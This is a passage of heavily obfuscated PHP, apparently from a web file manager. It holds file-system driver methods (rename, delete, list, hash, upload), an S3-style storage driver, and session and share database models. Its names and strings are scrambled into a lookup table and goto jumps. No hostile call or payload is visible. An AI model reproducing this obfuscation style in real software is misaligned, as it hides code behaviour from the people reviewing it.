$this->iconvSystem($ÍÎ…ÄÎå); $ø¾¿÷¦ù = $this->iconvSystem($ø¾¿÷¦ù); $™¹¾’Ø = rtrim($ø¾¿÷¦ù, $ø˜¼[8]) . $ø˜¼[8] . ($±Œ…´ï’ ? $±Œ…´ï’ : get_path_this($ÍÎ…ÄÎå)); if (file_exists($™¹¾’Ø)) { return !1; } $‹øôóÄÄ = intval(@rename($ÍÎ…ÄÎå, $™¹¾’Ø)); $‹øôóÄÄ = file_exists($™¹¾’Ø); if ($‹øôóÄÄ) { return $this->getPathOuter($™¹¾’Ø); } $this->writeLog(__FUNCTION__ . $ø˜¼[1472], !0); return !1; } public function delFile($úèõÃÂ) { $úèõÃÂ = $this->iconvSystem($úèõÃÂ); if (!@unlink($úèõÃÂ)) { @chmod($úèõÃÂ, $this->pathAuth); if (@unlink($úèõÃÂ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); return !1; } return !0; } public function delFolder($±¸ğØ¸¤) { $ÈèæˆØ =& $_SERVER[ùèÅ´Ãš]; $±¸ğØ¸¤ = $this->iconvSystem($±¸ğØ¸¤); if (!is_dir($±¸ğØ¸¤)) { return !0; } if (!($¾õ“¨éâ = opendir($±¸ğØ¸¤))) { return !1; } while (($£Ñ–×úÙ = readdir($¾õ“¨éâ)) !== !1) { if ($£Ñ–×úÙ == $ÈèæˆØ[10] || $£Ñ–×úÙ == $ÈèæˆØ[1377]) { continue; } $Ñòãñú” = $±¸ğØ¸¤ . $ÈèæˆØ[8] . $£Ñ–×úÙ; if (is_file($Ñòãñú”) || is_link($Ñòãñú”)) { if (!unlink($Ñòãñú”)) { chmod($Ñòãñú”, $this->pathAuth); if (!unlink($Ñòãñú”)) { return !1; } } } else { if (is_dir($Ñòãñú”)) { chmod($Ñòãñú”, $this->pathAuth); $Ñòãñú” = $this->iconvApp($Ñòãñú”); if (!$this->delFolder($Ñòãñú”)) { return !1; } } } } closedir($¾õ“¨éâ); return rmdir($±¸ğØ¸¤); } public function rename($ËÍğ¨ûä, $Å™±¢¤Ë) { $‰¬²‘êô =& $_SERVER[ùèÅ´Ãš]; $†«¸ÖúÃ = $this->fileNameAuto($this->pathFather($ËÍğ¨ûä), $Å™±¢¤Ë); $†«¸ÖúÃ = $this->iconvSystem($†«¸ÖúÃ); $ËÍğ¨ûä = $this->iconvSystem($ËÍğ¨ûä); $Öç×•¤ø = $this->pathFather($ËÍğ¨ûä); $¼µÆ°œ¶ = rtrim($Öç×•¤ø, $‰¬²‘êô[8]) . $‰¬²‘êô[8] . $†«¸ÖúÃ; $Ì‚º¤Ïñ = @rename($ËÍğ¨ûä, $¼µÆ°œ¶); $¼µÆ°œ¶ = $this->iconvApp($¼µÆ°œ¶); if ($Ì‚º¤Ïñ) { return $this->getPathOuter($¼µÆ°œ¶); } $this->writeLog(__FUNCTION__ . $‰¬²‘êô[1472], !0); return !1; } public function size($¼£¸íÈ) { $¼£¸íÈ = $this->iconvSystem($¼£¸íÈ); return filesize_64($¼£¸íÈ); } public function info($æ˜ÉÏ°š) { $æ˜ÉÏ°š = $this->iconvSystem($æ˜ÉÏ°š); if ($this->isFolder($æ˜ÉÏ°š)) { return $this->folderInfo($æ˜ÉÏ°š); } else { if ($this->isFile($æ˜ÉÏ°š)) { return $this->fileInfo($æ˜ÉÏ°š); } } return !1; } protected function infoChildren($¦¿ªÙ¥, &$¸ÎîşÖÄ, $¦›ä™Ùã = true) { $ó›¢œõ =& $_SERVER[ùèÅ´Ãš]; check_abort_echo(); $¦¿ªÙ¥ = rtrim($¦¿ªÙ¥, $ó›¢œõ[8]) . $ó›¢œõ[8]; if ($¦›ä™Ùã) { $¦¿ªÙ¥ = $this->iconvSystem($¦¿ªÙ¥); } if (!($üÆô—¾Ø = @opendir($¦¿ªÙ¥))) { return; } while (($£…±¸í¯ = readdir($üÆô—¾Ø)) !== !1) { if ($£…±¸í¯ == $ó›¢œõ[10] || $£…±¸í¯ == $ó›¢œõ[1377]) { continue; } $†¢‚Ç¹Š = $¦¿ªÙ¥ . $£…±¸í¯; if (is_file($†¢‚Ç¹Š) || is_link($†¢‚Ç¹Š)) { $¸ÎîşÖÄ[$ó›¢œõ[80]]++; $¸ÎîşÖÄ[$ó›¢œõ[79]] += filesize_64($†¢‚Ç¹Š); } else { if (is_dir($†¢‚Ç¹Š)) { $¸ÎîşÖÄ[$ó›¢œõ[81]]++; $this->infoChildren($†¢‚Ç¹Š, $¸ÎîşÖÄ, !1); } } } closedir($üÆô—¾Ø); } private function folderInfo($¢ß‡†ƒı, $ñÚÑ÷ÆØ = false) { $¤¹òıâ¡ =& $_SERVER[ùèÅ´Ãš]; $¢ß‡†ƒı = rtrim($¢ß‡†ƒı, $¤¹òıâ¡[8]) . $¤¹òıâ¡[8]; $ßıÍ­­ = $this->iconvApp($this->pathThis($¢ß‡†ƒı)); if ($ñÚÑ÷ÆØ) { return array($¤¹òıâ¡[32] => $ßıÍ­­, $¤¹òıâ¡[87] => $this->getPathOuter($¢ß‡†ƒı), $¤¹òıâ¡[33] => $¤¹òıâ¡[78]); } $ãÏä”ü¨ = array($¤¹òıâ¡[32] => $ßıÍ­­, $¤¹òıâ¡[87] => $this->getPathOuter($¢ß‡†ƒı), $¤¹òıâ¡[33] => $¤¹òıâ¡[78], $¤¹òıâ¡[234] => @filectime($¢ß‡†ƒı), $¤¹òıâ¡[88] => @filemtime($¢ß‡†ƒı), $¤¹òıâ¡[1476] => @fileatime($¢ß‡†ƒı), $¤¹òıâ¡[1477] => is_readable($¢ß‡†ƒı), $¤¹òıâ¡[1478] => is_writable($¢ß‡†ƒı), $¤¹òıâ¡[1479] => get_mode($¢ß‡†ƒı)); return $ãÏä”ü¨; } private function fileInfo($ö…—áÓÕ, $³£çİêİ = false) { $Ç¦‹ =& $_SERVER[ùèÅ´Ãš]; $—şşéÉË = $this->iconvApp($this->pathThis($ö…—áÓÕ)); if ($³£çİêİ) { return array($Ç¦‹[32] => $—şşéÉË, $Ç¦‹[87] => $this->getPathOuter($ö…—áÓÕ), $Ç¦‹[33] => $Ç¦‹[233], $Ç¦‹[79] => $this->size($ö…—áÓÕ), $Ç¦‹[169] => $this->ext($—şşéÉË)); } $µÑÇèÕö = array($Ç¦‹[32] => $—şşéÉË, $Ç¦‹[87] => $this->getPathOuter($ö…—áÓÕ), $Ç¦‹[33] => $Ç¦‹[233], $Ç¦‹[234] => @filectime($ö…—áÓÕ), $Ç¦‹[88] => @filemtime($ö…—áÓÕ), $Ç¦‹[1476] => @fileatime($ö…—áÓÕ), $Ç¦‹[79] => $this->size($ö…—áÓÕ), $Ç¦‹[169] => $this->ext($—şşéÉË), $Ç¦‹[1477] => is_readable($ö…—áÓÕ), $Ç¦‹[1478] => is_writable($ö…—áÓÕ), $Ç¦‹[1479] => get_mode($ö…—áÓÕ)); return $µÑÇèÕö; } public function exist($»êì×ù») { $»êì×ù» = $this->iconvSystem($»êì×ù»); return @file_exists($»êì×ù»); } public function isFile($ÜøÛßÛ¦) { $ÜøÛßÛ¦ = $this->iconvSystem($ÜøÛßÛ¦); return @is_file($ÜøÛßÛ¦); } public function isFolder($ƒŒ‚àü¯) { $ƒŒ‚àü¯ = $this->iconvSystem($ƒŒ‚àü¯); return @is_dir($ƒŒ‚àü¯); } public function listPath($úüäÌ, $Ç¾„”ËÅ = false) { $¯“„…®Ö =& $_SERVER[ùèÅ´Ãš]; $úüäÌ = $this->iconvSystem($úüäÌ); $úüäÌ = rtrim($úüäÌ, $¯“„…®Ö[8]) . $¯“„…®Ö[8]; $‚¡ôÖ’‹ = array($¯“„…®Ö[85] => array(), $¯“„…®Ö[86] => array()); if (!($£¢Ì«š¡ = @opendir($úüäÌ))) { return $‚¡ôÖ’‹; } while (($›°òª©£ = readdir($£¢Ì«š¡)) !== !1) { if ($›°òª©£ == $¯“„…®Ö[10] || $›°òª©£ == $¯“„…®Ö[1377]) { continue; } $“ïææÇÅ = $úüäÌ . $›°òª©£; if (is_file($“ïææÇÅ)) { $‚¡ôÖ’‹[$¯“„…®Ö[86]][] = $this->fileInfo($“ïææÇÅ, $Ç¾„”ËÅ); } else { $‚¡ôÖ’‹[$¯“„…®Ö[85]][] = $this->folderInfo($“ïææÇÅ, $Ç¾„”ËÅ); } } closedir($£¢Ì«š¡); return $‚¡ôÖ’‹; } public function listAll($‹×ŠÙğ¾, &$õéïé¤ü = array()) { $Ğá³Äû =& $_SERVER[ùèÅ´Ãš]; $‹×ŠÙğ¾ = $this->iconvSystem($‹×ŠÙğ¾); $‹×ŠÙğ¾ = rtrim($‹×ŠÙğ¾, $Ğá³Äû[8]) . $Ğá³Äû[8]; if (!($ãïşÚÖÓ = @opendir($‹×ŠÙğ¾))) { return $õéïé¤ü; } while (($ğ“çïÍª = readdir($ãïşÚÖÓ)) !== !1) { if ($ğ“çïÍª == $Ğá³Äû[10] || $ğ“çïÍª == $Ğá³Äû[1377]) { continue; } $«¥’ü¬Ù = $‹×ŠÙğ¾ . $ğ“çïÍª; $ÛÖé³úˆ = is_dir($«¥’ü¬Ù) && !is_link($«¥’ü¬Ù) ? 1 : 0; $«¥’ü¬Ù = $ÛÖé³úˆ ? $«¥’ü¬Ù . $Ğá³Äû[8] : $«¥’ü¬Ù; $õéïé¤ü[] = array($Ğá³Äû[87] => $this->getPathOuter($«¥’ü¬Ù), $Ğá³Äû[78] => $ÛÖé³úˆ, $Ğá³Äû[88] => intval(@filemtime($«¥’ü¬Ù)), $Ğá³Äû[79] => $ÛÖé³úˆ ? 0 : intval($this->size($«¥’ü¬Ù))); if ($ÛÖé³úˆ) { $this->listAll($«¥’ü¬Ù, $õéïé¤ü); } } closedir($ãïşÚÖÓ); return $õéïé¤ü; } public function has($‡¿¿Ë½®, $Âó±Ö¸Ô = false, $¬¦å² Ã = true) { $»…¹Åá =& $_SERVER[ùèÅ´Ãš]; $‡¿¿Ë½® = $this->iconvSystem($‡¿¿Ë½®); $‡¿¿Ë½® = rtrim($‡¿¿Ë½®, $»…¹Åá[8]) . $»…¹Åá[8]; if (!($å¹ø·¤Å = @opendir($‡¿¿Ë½®))) { return !1; } $İ¨ßŸ†ö = 0; $÷³æ“ö = 0; $¶×ÑÇÑ— = 0; while (($³ªîºÌ° = readdir($å¹ø·¤Å)) !== !1) { if ($³ªîºÌ° == $»…¹Åá[10] || $³ªîºÌ° == $»…¹Åá[1377]) { continue; } $˜‰™á¦ = $‡¿¿Ë½® . $³ªîºÌ°; if ($Âó±Ö¸Ô) { $¶×ÑÇÑ—++; if (@is_file($˜‰™á¦)) { $İ¨ßŸ†ö++; } else { $÷³æ“ö++; } if ($¶×ÑÇÑ— > 10000) { break; } continue; } if ($¬¦å² Ã) { if (@is_file($˜‰™á¦)) { return !0; } } else { if (@is_dir($˜‰™á¦ . $»…¹Åá[8])) { return !0; } } } closedir($å¹ø·¤Å); if ($Âó±Ö¸Ô) { return array($»…¹Åá[242] => $İ¨ßŸ†ö, $»…¹Åá[243] => $÷³æ“ö); } return !1; } public function hashSimple($Ì°ôêùÍ) { $‰ª–Ã±£ =& $_SERVER[ùèÅ´Ãš]; if (!$Ì°ôêùÍ) { return md5($‰ª–Ã±£[12]); } $Ì°ôêùÍ = $this->iconvSystem($Ì°ôêùÍ); $ªõšŠ®¹ = $this->size($Ì°ôêùÍ); $Ï‘¯÷œ‹ = 200; $ÓãŒÆŠÕ = 50; if ($ªõšŠ®¹ <= $Ï‘¯÷œ‹ * $ÓãŒÆŠÕ) { return $this->hashMd5($Ì°ôêùÍ) . $ªõšŠ®¹; } $²ò·‹Í = $‰ª–Ã±£[12]; $ˆ¬§Åïá = intval($ªõšŠ®¹ / $ÓãŒÆŠÕ); $ìÓ¦´…ñ = fopen($Ì°ôêùÍ, $‰ª–Ã±£[1480]); if (!$ìÓ¦´…ñ) { return $²ò·‹Í; } for ($Èåò‚ê = 0; $Èåò‚ê < $ÓãŒÆŠÕ; $Èåò‚ê++) { fseek_64($ìÓ¦´…ñ, $ˆ¬§Åïá * $Èåò‚ê); $²ò·‹Í .= fread($ìÓ¦´…ñ, $Ï‘¯÷œ‹); } fseek_64($ìÓ¦´…ñ, $ªõšŠ®¹ - $Ï‘¯÷œ‹); $²ò·‹Í .= fread($ìÓ¦´…ñ, $Ï‘¯÷œ‹); fclose($ìÓ¦´…ñ); return md5($²ò·‹Í) . $ªõšŠ®¹; } public function getContent($óÏ‘ÁÉ—) { $óÏ‘ÁÉ— = $this->iconvSystem($óÏ‘ÁÉ—); return file_get_contents($óÏ‘ÁÉ—); } public function setContent($òíÀ×Ùº, $İº¨´î€ = '') { $òíÀ×Ùº = $this->iconvSystem($òíÀ×Ùº); $«êÈäŸÄ = @file_put_contents($òíÀ×Ùº, $İº¨´î€, LOCK_EX); if (!$«êÈäŸÄ) { $this->writeLog(__FUNCTION__ . $_SERVER[ùèÅ´Ãš][1472], !0); } clearstatcache(); @chmod($òíÀ×Ùº, $this->pathAuth); return $«êÈäŸÄ === !1 ? !1 : !0; } public function fileSubstr($áã¦— ú, $…¿¯íŒµ = 0, $ãÀèÃ› = false) { $ó›ÊË¯Ô =& $_SERVER[ùèÅ´Ãš]; $áã¦— ú = $this->iconvSystem($áã¦— ú); if ($ãÀèÃ› === !1) { $ãÀèÃ› = $this->size($áã¦— ú); } if ($ãÀèÃ› <= 0) { return $ó›ÊË¯Ô[12]; } $‹‹£¼†¾ = fopen($áã¦— ú, $ó›ÊË¯Ô[1480]); if (!$‹‹£¼†¾) { return !1; } fseek_64($‹‹£¼†¾, $…¿¯íŒµ); $·â‰–ÂË = fread($‹‹£¼†¾, $ãÀèÃ›); fclose($‹‹£¼†¾); if (!$·â‰–ÂË) { $this->writeLog(__FUNCTION__ . $ó›ÊË¯Ô[1472], !0); } return $·â‰–ÂË; } public function upload($¨æˆıœ, $’÷£ÆÄ¸, $ş³¹½’Ô = false, $ÉÖÛÈ®Ş = REPEAT_REPLACE) { if ($ş³¹½’Ô) { return $this->moveFile($’÷£ÆÄ¸, $¨æˆıœ); } return $this->copyFile($’÷£ÆÄ¸, $¨æˆıœ); } public function setModifyTime($´†•âòÊ, $ºèÛ‚ ‡ = '') { @touch($´†•âòÊ, intval($ºèÛ‚ ‡)); } public function download($–µ¬¤šŒ, $Ÿ—çúöÜ) { return $this->iconvSystem($–µ¬¤šŒ); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($•­ôö†Ş) { parent::__construct($•­ôö†Ş); $this->setSignVersion($_SERVER[ùèÅ´Ãš][250]); } public function fileOutImage($†õ¡­, $‚šâÑÔ§ = 250) { $óøÙÏÎ­ =& $_SERVER[ùèÅ´Ãš]; if ($this->size($†õ¡­) > 1024 * 1024 * 25) { return $this->fileOutImageServer($†õ¡­, $‚šâÑÔ§); } $åğÅÚßë = array($óøÙÏÎ­[1481] => $óøÙÏÎ­[1482] . $‚šâÑÔ§ . $óøÙÏÎ­[1483]); $ÌØøÕ’Ö = $this->link($†õ¡­, $åğÅÚßë); $this->fileOutLink($ÌØøÕ’Ö); } } goto b‹®šõóÜ‹; BÚ¬¬ÏÂÄ”: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\155\137\x73\145\x73\x73\x69\x6f\156"; public function get($ƒÀ¿ŸÍª) { $ Ÿ©€‚Æ =& $_SERVER[ùèÅ´Ãš]; $úÉàÌÌÌ = $this->where(array($ Ÿ©€‚Æ[2136] => $ƒÀ¿ŸÍª))->find(); if (!is_array($úÉàÌÌÌ)) { return !1; } return $úÉàÌÌÌ[$ Ÿ©€‚Æ[171]]; } public function set($’éÏµÒ·, $ş¶úéëò, $ä³¶Öí— = 3600) { $Áãä¨… =& $_SERVER[ùèÅ´Ãš]; $Ö¦Î¬¿Ø = array($Áãä¨…[2136] => $’éÏµÒ·, $Áãä¨…[2036] => $ş¶úéëò, $Áãä¨…[2137] => $ä³¶Öí— + time()); if (Session::get($Áãä¨…[2138])) { $Ö¦Î¬¿Ø[$Áãä¨…[1797]] = Session::get($Áãä¨…[2138]); } else { $Ö¦Î¬¿Ø[$Áãä¨…[1797]] = 0; } if ($this->get($’éÏµÒ·)) { return $this->where(array($Áãä¨…[2136] => $’éÏµÒ·))->save($Ö¦Î¬¿Ø); } else { return $this->add($Ö¦Î¬¿Ø, array(), !0); } } public function remove($®£ì©Õ) { return $this->where(array($_SERVER[ùèÅ´Ãš][2136] => $®£ì©Õ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ùèÅ´Ãš][2139] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\x72\x65"; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\151\155\145", "\164\151\x6d\x65", "\151\156\163\x65\x72\x74\54\165\160\144\x61\x74\145", "\146\x75\156\143\x74\151\157\156"), array("\143\x72\145\x61\x74\x65\x54\x69\155\145", "\x74\151\155\x65", "\x69\156\x73\x65\x72\x74", "\146\x75\156\143\x74\x69\x6f\x6e"), array("\x6f\x70\x74\x69\157\x6e\x73", '', "\151\156\x73\145\x72\164\x2c\165\160\x64\141\x74\x65\x2c\163\145\154\145\x63\x74", "\152\163\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($Ñàã¸ô) { $½’õÄš› =& $_SERVER[ùèÅ´Ãš]; $úÛğ´­ = isset($Ñàã¸ô[0]) ? $Ñàã¸ô[0] : !1; $óİ¯Şî = $½’õÄš›[2140] . USER_ID; return array($½’õÄš›[2141] => array(USER_ID, $½’õÄš›[2142]), $½’õÄš›[2081] => array($úÛğ´­, $½’õÄš›[2143], $óİ¯Şî)); } protected function listSimple() { $ááÉ†Ô› = array($_SERVER[ùèÅ´Ãš][1797] => USER_ID); $«« ÒÓ = $this->field($this->fieldList)->where($ááÉ†Ô›)->select(); return $«« ÒÓ ? $«« ÒÓ : array(); } protected function getInfo($İñ—üŠğ, $ñÎ‰¦³Å = false, $¾½ÙìâÁ = '') { $Şú³É¾ =& $_SERVER[ùèÅ´Ãš]; if (!$¾½ÙìâÁ) { $¾½ÙìâÁ = $Şú³É¾[2140] . USER_ID; } if ($ñÎ‰¦³Å) { return $this->_getShareInfo(array($Şú³É¾[672] => $İñ—üŠğ)); } $ €Ğ¸Ã® = $this->cacheFunctionGet($Şú³É¾[2083], $İñ—üŠğ, $¾½ÙìâÁ); $¨š×‡ÅÒ = $this->shareInfoMofify($ €Ğ¸Ã®, $Şú³É¾[226]); if (isset($ €Ğ¸Ã®[$Şú³É¾[88]]) && $¨š×‡ÅÒ != $ €Ğ¸Ã®[$Şú³É¾[88]]) { $’Ï©ßÀƒ = $this->cacheKeyMake($Şú³É¾[2083], $İñ—üŠğ, $¾½ÙìâÁ); $ €Ğ¸Ã® = $this->_getShareInfo(array($Şú³É¾[672] => $İñ—üŠğ)); Cache::set($’Ï©ßÀƒ, $ €Ğ¸Ã®); } return $ €Ğ¸Ã®; } private function shareInfoMofify(&$‹Õïã»·, $‰œ‰£‰ˆ = "\x67\145\164") { $§ÚÊ‚·­ =& $_SERVER[ùèÅ´Ãš]; if (!$‹Õïã»· || !isset($‹Õïã»·[$§ÚÊ‚·­[672]])) { return; } $¾È£öÃö = $§ÚÊ‚·­[2144] . $‹Õïã»·[$§ÚÊ‚·­[672]]; if ($‰œ‰£‰ˆ == $§ÚÊ‚·­[226]) { return Cache::get($¾È£öÃö); } else { if ($‰œ‰£‰ˆ == $§ÚÊ‚·­[2112]) { $ÌÃ úúù = Cache::get($¾È£öÃö); if ($ÌÃ úúù === $‹Õïã»·[$§ÚÊ‚·­[88]]) { return; } $‹Õïã»·[$§ÚÊ‚·­[2145]] = USER_ID . $§ÚÊ‚·­[464] . $‹Õïã»·[$§ÚÊ‚·­[88]]; Cache::set($¾È£öÃö, $‹Õïã»·[$§ÚÊ‚·­[88]]); } else { if ($‰œ‰£‰ˆ == $§ÚÊ‚·­[2146]) { Cache::remove($¾È£öÃö); } } } } public function getInfoByHash($âù”ŠÖ©) { return $this->_getShareInfo(array($_SERVER[ùèÅ´Ãš][2147] => $âù”ŠÖ©)); } public function getInfoByPath($²º»ö™ä) { $¡ÑøÅØì =& $_SERVER[ùèÅ´Ãš]; $º¹²öú¼ = array($¡ÑøÅØì[1797] => USER_ID, $¡ÑøÅØì[194] => $²º»ö™ä); return $this->_getShareInfo($º¹²öú¼); } public function getInfoBySourcePath($˜ç·»Š) { $µè¿  =& $_SERVER[ùèÅ´Ãš]; $œÛıôËÂ = array($µè¿ [1797] => USER_ID, $µè¿ [1271] => $˜ç·»Š); return $this->_getShareInfo($œÛıôËÂ); } private function _getShareInfo($­£ñìª©) { $ÈıËü =& $_SERVER[ùèÅ´Ãš]; $šÒÈŞëš = $this->where($­£ñìª©)->find(); if (!$šÒÈŞëš) { return !1; } $­£ñìª© = array($ÈıËü[672] => $šÒÈŞëš[$ÈıËü[672]]); $ÔÈËÄÂ = $ÈıËü[2148]; $ÕšÎÊÊß = Model($ÈıËü[673])->order($ÈıËü[477])->field($ÔÈËÄÂ)->where($­£ñìª©)->select(); if ($šÒÈŞëš[$ÈıËü[194]] == $ÈıËü[231]) { $šÒÈŞëš[$ÈıËü[90]] = IO::info($šÒÈŞëš[$ÈıËü[1271]]); } else { $šÒÈŞëš[$ÈıËü[90]] = Model($ÈıËü[1442])->pathInfo($šÒÈŞëš[$ÈıËü[194]]); } $šÒÈŞëš[$ÈıËü[2149]] = $ÕšÎÊÊß; $this->shareInfoMofify($šÒÈŞëš, $ÈıËü[2112]); return $šÒÈŞëš; } protected function getInfoAuth($»àÖí©ñ) { $ÊŞ‹ÃÇ =& $_SERVER[ùèÅ´Ãš]; $“œÚœÜ = $this->getInfo($»àÖí©ñ); if ($“œÚœÜ[$ÊŞ‹ÃÇ[1797]] == USER_ID) { $“œÚœÜ[$ÊŞ‹ÃÇ[489]] = $“œÚœÜ[$ÊŞ‹ÃÇ[90]][$ÊŞ‹ÃÇ[489]]; } else { $“œÚœÜ[$ÊŞ‹ÃÇ[489]] = Model($ÊŞ‹ÃÇ[571])->authMake($“œÚœÜ[$ÊŞ‹ÃÇ[2149]]); } return $“œÚœÜ; } protected function listData($¯Í¦ÕË‘ = null, $ £œùÑ = 300) { $Ñ»Í‚è =& $_SERVER[ùèÅ´Ãš]; $ıÚ×ôı¼ = array(array($Ñ»Í‚è[566] => array($Ñ»Í‚è[1100], 0), $Ñ»Í‚è[670] => array($Ñ»Í‚è[1100], 0), $Ñ»Í‚è[2150] => $Ñ»Í‚è[2100])); if ($¯Í¦ÕË‘ == $Ñ»Í‚è[2151]) { $ıÚ×ôı¼ = array($Ñ»Í‚è[566] => 1); } else { if ($¯Í¦ÕË‘ == $Ñ»Í‚è[1254]) { $ıÚ×ôı¼ = array($Ñ»Í‚è[670] => 1); } } $ıÚ×ôı¼[$Ñ»Í‚è[1797]] = USER_ID; $İæöÛÔ = $this->where($ıÚ×ôı¼)->selectPage($ £œùÑ); return $İæöÛÔ; } protected function listToMe($¹ÜÀé• = 300) { $ÌŸéğ˜ =& $_SERVER[ùèÅ´Ãš]; $ó—”’” = Model($ÌŸéğ˜[2152])->userGroupParents(USER_ID); $û–õ”ä¡ = array($ÌŸéğ˜[655] => SourceModel::TYPE_USER, $ÌŸéğ˜[573] => USER_ID); if ($ó—”’”) { $û–õ”ä¡ = array(array($ÌŸéğ˜[655] => SourceModel::TYPE_USER, $ÌŸéğ˜[573] => USER_ID), array($ÌŸéğ˜[655] => SourceModel::TYPE_GROUP, $ÌŸéğ˜[573] => array($ÌŸéğ˜[7], $ó—”’”)), $ÌŸéğ˜[2150] => $ÌŸéğ˜[2100]); } $íÅÌ½®† = Model($ÌŸéğ˜[673])->where($û–õ”ä¡)->selectPage($¹ÜÀé•); $¿Ÿˆ¹ª = array_to_keyvalue_group($íÅÌ½®†[$ÌŸéğ˜[447]], $ÌŸéğ˜[672]); if (!$¿Ÿˆ¹ª) { return $íÅÌ½®†; } $Ç¿¡ÔûÉ = $ÌŸéğ˜[2153]; $û–õ”ä¡ = array($ÌŸéğ˜[672] => array($ÌŸéğ˜[494], array_keys($¿Ÿˆ¹ª)), $ÌŸéğ˜[1797] => array($ÌŸéğ˜[1102], $ÌŸéğ˜[231])); $Ÿè¤ïíà = $this->field($Ç¿¡ÔûÉ)->where($û–õ”ä¡)->select(); foreach ($Ÿè¤ïíà as $‚±æ¯•Ì => &$ù»Ş¦¶) { $ù»Ş¦¶[$ÌŸéğ˜[2149]] = $¿Ÿˆ¹ª[$ù»Ş¦¶[$ÌŸéğ˜[672]]]; } unset($ù»Ş¦¶); $ÄìÖà¼¥ = array($ÌŸéğ˜[2154] => $Ÿè¤ïíà, $ÌŸéğ˜[2155] => $íÅÌ½®†[$ÌŸéğ˜[444]]); return $ÄìÖà¼¥; } protected function shareAdd($š²ó˜ö×, $ˆËÎÚêÖ) { $ÙÈÄ‡¤É =& $_SERVER[ùèÅ´Ãš]; $“©óë×• = $this->_addShareData($š²ó˜ö×, $ˆËÎÚêÖ); if (!empty($ˆËÎÚêÖ[$ÙÈÄ‡¤É[2156]])) { $this->_shareAuthSet($“©óë×•, $ˆËÎÚêÖ[$ÙÈÄ‡¤É[2156]]); } $this->shareEventAdd($š²ó˜ö×, $ˆËÎÚêÖ, $ÙÈÄ‡¤É[2157]); return $“©óë×•; } protected function shareAddSystem($ÄÕÃä·ì, $´”ø×â®) { $ß‘ÍÓï± =& $_SERVER[ùèÅ´Ãš]; $°Ÿ„ªï§ = $this->_addShareData($ÄÕÃä·ì, $´”ø×â®, $ß‘ÍÓï±[192]); $this->_shareAuthSet($°Ÿ„ªï§, $´”ø×â®[$ß‘ÍÓï±[2156]]); return $°Ÿ„ªï§; } private function shareEventAdd($‘éüé, $Ô¡ ŞŒ¦, $¦¨Öï‰€ = "\x61\x64\144") { $…ºŞÒ³ =& $_SERVER[ùèÅ´Ãš]; if (!$‘éüé || $‘éüé == $…ºŞÒ³[231]) { return; } if ($¦¨Öï‰€ == $…ºŞÒ³[2157]) { if ($Ô¡ ŞŒ¦[$…ºŞÒ³[566]] == $…ºŞÒ³[91]) { Model($…ºŞÒ³[640])->eventShare($‘éüé, $…ºŞÒ³[2158]); } if ($Ô¡ ŞŒ¦[$…ºŞÒ³[670]] == $…ºŞÒ³[91]) { Model($…ºŞÒ³[640])->eventShare($‘éüé, $…ºŞÒ³[2159]); } return; } $˜‹à²öä = $this->getInfoByPath($‘éüé); $ËÃÏËœø = $…ºŞÒ³[2160]; if ($˜‹à²öä[$…ºŞÒ³[566]] == $…ºŞÒ³[231] && $Ô¡ ŞŒ¦[$…ºŞÒ³[566]] == $…ºŞÒ³[91]) { $ËÃÏËœø = $…ºŞÒ³[2158]; } if ($˜‹à²öä[$…ºŞÒ³[566]] == $…ºŞÒ³[91] && $Ô¡ ŞŒ¦[$…ºŞÒ³[566]] == $…ºŞÒ³[231]) { $ËÃÏËœø = $…ºŞÒ³[2161]; } if ($˜‹à²öä[$…ºŞÒ³[670]] == $…ºŞÒ³[231] && $Ô¡ ŞŒ¦[$…ºŞÒ³[670]] == $…ºŞÒ³[91]) { $ËÃÏËœø = $…ºŞÒ³[2159]; } if ($˜‹à²öä[$…ºŞÒ³[670]] == $…ºŞÒ³[91] && $Ô¡ ŞŒ¦[$…ºŞÒ³[670]] == $…ºŞÒ³[231]) { $ËÃÏËœø = $…ºŞÒ³[2162]; } Model($…ºŞÒ³[640])->eventShare($‘éüé, $ËÃÏËœø); return; } private function _addShareData($àâ‹èÓª, $ôˆ‘ã˜¼ = array(), $ÁÓœƒÑò = false) { $‘Ÿé âŸ =& $_SERVER[ùèÅ´Ãš]; $Ç’ïÙ¤ã = $ÁÓœƒÑò == $‘Ÿé âŸ[192] ? 0 : USER_ID; $ìÜè¹À± = array($‘Ÿé âŸ[493] => $àâ‹èÓª, $‘Ÿé âŸ[1788] => $Ç’ïÙ¤ã); if ($àâ‹èÓª == 0) { $ìÜè¹À± = array($‘Ÿé âŸ[2163] => $ôˆ‘ã˜¼[$‘Ÿé âŸ[1271]], $‘Ÿé âŸ[1788] => $Ç’ïÙ¤ã); } if ($½Ã‰şû› = $this->where($ìÜè¹À±)->find()) { return $½Ã‰şû›[$‘Ÿé âŸ[672]]; } if ($àâ‹èÓª == 0) { $¹‚Üƒâ = array($‘Ÿé âŸ[32] => get_path_this($ôˆ‘ã˜¼[$‘Ÿé âŸ[87]])); } else { $¹‚Üƒâ = Model($‘Ÿé âŸ[908])->sourceInfo($àâ‹èÓª); if (!$¹‚Üƒâ) { return !1; } } if (!$ôˆ‘ã˜¼[$‘Ÿé âŸ[1683]]) { $ôˆ‘ã˜¼[$‘Ÿé âŸ[1683]] = $¹‚Üƒâ[$‘Ÿé âŸ[32]]; } $İÂúñåÇ = array($‘Ÿé âŸ[1788] => $Ç’ïÙ¤ã, $‘Ÿé âŸ[493] => $àâ‹èÓª, $‘Ÿé âŸ[1683] => $‘Ÿé âŸ[12], $‘Ÿé âŸ[566] => 0, $‘Ÿé âŸ[670] => 0, $‘Ÿé âŸ[1271] => $‘Ÿé âŸ[12], $‘Ÿé âŸ[384] => $‘Ÿé âŸ[12], $‘Ÿé âŸ[977] => $‘Ÿé âŸ[12], $‘Ÿé âŸ[2164] => 0, $‘Ÿé âŸ[2165] => 0, $‘Ÿé âŸ[839] => 0, $‘Ÿé âŸ[2166] => $‘Ÿé âŸ[12], $‘Ÿé âŸ[2147] => $‘Ÿé âŸ[12]); $èí‰Óƒæ = explode($‘Ÿé âŸ[50], $‘Ÿé âŸ[2167]); foreach ($èí‰Óƒæ as $Ò§æÖÒÚ) { if (!isset($ôˆ‘ã˜¼[$Ò§æÖÒÚ])) { continue; } $İÂúñåÇ[$Ò§æÖÒÚ] = 